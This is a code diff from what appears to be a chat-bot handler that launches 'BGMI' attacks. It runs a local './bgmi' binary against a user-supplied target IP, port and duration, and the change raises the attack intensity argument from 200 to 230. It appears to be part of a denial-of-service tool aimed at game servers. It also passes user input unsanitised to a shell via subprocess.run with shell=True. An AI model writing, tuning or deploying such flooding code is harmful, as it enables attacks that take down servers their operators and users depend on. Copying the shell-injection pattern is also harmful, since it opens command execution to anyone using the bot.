@@ -256,7 +256,7 @@ def handle_bgmi(message):
                 start_attack_reply(
                     message, target, port, time
                 )  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 200"
+                full_command = f"./bgmi {target} {port} {time} 230"
                 subprocess.run(full_command, shell=True)
                 response = (
                     f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
